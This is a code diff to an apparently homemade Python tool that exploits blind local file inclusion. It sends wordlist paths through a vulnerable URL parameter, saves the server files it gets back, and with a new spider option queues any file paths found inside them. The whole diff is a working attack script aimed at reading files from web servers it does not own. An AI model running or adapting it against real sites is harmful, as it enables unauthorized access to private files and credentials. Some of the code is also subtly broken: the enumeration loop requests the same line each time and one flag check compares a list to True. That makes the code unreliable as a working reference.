@@ -4,7 +4,10 @@ import os
 import errno
 import re
 import codecs
+from bs4 import BeautifulSoup
 
+
+from pprint import pprint
 ### ARG BLOCK ###
 ap = argparse.ArgumentParser(description="a tool used to map a filesystem though local file inclusion, when you encounter a blind LFI situation",epilog="WARNING: im still new to python, so im not doing much error checking on the URL's. if its not working, double check your -u")
 ap.add_argument('-u', '--url', metavar="web.com/lfi.php?file=" ,help="enter the url to do LFI on. ex: http://www.example.com/file.php?page= ",nargs=1, required=True)
@@ -13,14 +16,18 @@ ap.add_argument('-r', '--rate', metavar="<int>checks per second" ,help="[not imp
 ap.add_argument('-o', '--output-root', metavar="<file>", help="the root directory that files will be written to. default is ./chroot", default="chroot", nargs=1)
 ap.add_argument('-e', '--enumerate' , metavar="<bool>", help="files with numbers in them will be enumerated up to the padding. '0-file' will be enumerated from 0 to 9. '00-file' will be enumerated from 0 to 99", default=False, type=bool, nargs =1)
 ap.add_argument('-l', '--enum-limit' , metavar="<int>", help="number of characters you want to limit for enumeration. for example, if this is set to 3, 000-file will still enumerate, but 0000-file will not.", default=0, type=int, nargs =1)
+ap.add_argument('-s', '--spider' , metavar="<bool>", help="append found file paths to the end of the search. this will not change your wordlist on file.", default=True, type=bool, nargs =1)
+
+
+args = ap.parse_args()
 
 ### FUNCTION BLOCK ###
 def writeFile(path, data):
-	dirtree = os.path.dirname(path)
-	makePath(dirtree)
-	file = codecs.open( path, "w+", encoding='utf8')
-	file.write(data)
-	file.close()
+    dirtree = os.path.dirname(path)
+    makePath(dirtree)
+    file = codecs.open( path, "w+", encoding='utf8')
+    file.write(data)
+    file.close()
 
 def makePath(path):
     try:
@@ -28,6 +35,13 @@ def makePath(path):
     except OSError as exception:
         if exception.errno != errno.EEXIST:
             raise
+
+def findFilePath(data):
+    soup = BeautifulSoup(data)
+    paths = re.findall(r'''\.?\.?(/[^/: \t\n]+)+''', soup.get_text())
+    filtered_paths = filter(None, paths)
+    return filtered_paths
+
 
 def find_number_in_filename(path):
     # remove the path and the extension
@@ -52,8 +66,28 @@ def file_len(fname):
     return i + 1
 
 
-### CODE ENTRY POINT ###
-args = ap.parse_args()
+def nonEnumeratedRequest(lines):
+    website = requests.get(args.url[0] + lines.strip('\n'))
+    if website.text != badsite.text:
+        writeFile(args.output_root[0] + lines.strip('\n') ,website.text)
+        if args.spider == True:
+            print "ADDING : " + str(findFilePath(website.text))
+            return findFilePath(website.text)
+
+
+def enumeratedRequest(prefix, suffix, num_length, lines):
+    templist = []
+    all_numbered_versions = [("%s%0"+str(num_length)+"d%s") % (prefix, ii, suffix) for ii in range(0,10**num_length)]
+    for element in all_numbered_versions:
+        print("\tenum ("+str(element)+" out of "+str(10**num_length - 1)+" total numbers)")
+        ret = nonEnumeratedRequest(lines)
+        if ret is not None:
+            templist.extend(ret)
+    return templist
+
+##################
+#Code Entry Point#
+##################
 
 #get a known bad page
 badsite = requests.get(args.url[0] + "thiscantbeanactualpage_1092817163jahdial")
@@ -63,29 +97,26 @@ linenum = 0
 percent = 2
 
 with open(args.infile[0],'r') as files:
-	urlends = files.readlines()
+    urlends = files.readlines()
 
 for lines in urlends:
-	linenum += 1
-	#if(float(linenum) / float(filelen) * 100 > percent):
-	print(str(float(linenum) / float(filelen) * 100)+"%...")
-		#percent+=2
+    linenum += 1
+    #if(float(linenum) / float(filelen) * 100 > percent):
+    print(str(float(linenum) / float(filelen) * 100)+"%...")
+        #percent+=2
 
-	if args.enumerate[0] == True:
-		prefix, suffix, num_length = find_number_in_filename(lines.strip('\n')) # scan for numbers and split
-		if num_length == 0 or num_length > args.enum_limit[0]: #if no numbers are found... just do the non enumerated bit of code.
-			website = requests.get(args.url[0] + lines.strip('\n'))
-			if website.text != badsite.text:
-				writeFile(args.output_root[0] + lines.strip('\n') ,website.text)
-		else: #HEY! we have numbers to enumerate!
-			all_numbered_versions = [("%s%0"+str(num_length)+"d%s") % (prefix, ii, suffix) for ii in range(0,10**num_length)]
-			for element in all_numbered_versions:
-				print("\tenum ("+str(element)+" out of "+str(10**num_length - 1)+" total numbers)")
-				website = requests.get(args.url[0] + element)
-				if website.text != badsite.text:
-					writeFile(args.output_root[0] + element , website.text)
-	else:
-		website = requests.get(args.url[0] + lines.strip('\n'))
-		if website.text != badsite.text:
-			writeFile(args.output_root[0] + lines.strip('\n') ,website.text)
+    if args.enumerate == True:
+        prefix, suffix, num_length = find_number_in_filename(lines.strip('\n')) # scan for numbers and split
+        if num_length == 0 or num_length > args.enum_limit[0]: #if no numbers are found... just do the non enumerated bit of code.
+            ret = nonEnumeratedRequest(lines) #TODO: clean this up, currently, nonEnumeratedRequest will return a file path if spider is on, and you append that.
+            if ret is not None:
+                urlends.extend(ret)
+        else: #HEY! we have numbers to enumerate!
+            ret = enumeratedRequest(prefix, suffix, num_length, lines)
+            if ret is not None:
+                urlends.extend(ret)
+    else:
+        ret = nonEnumeratedRequest(lines)
+        if ret is not None:
+            urlends.extend(ret)
 print("100%")
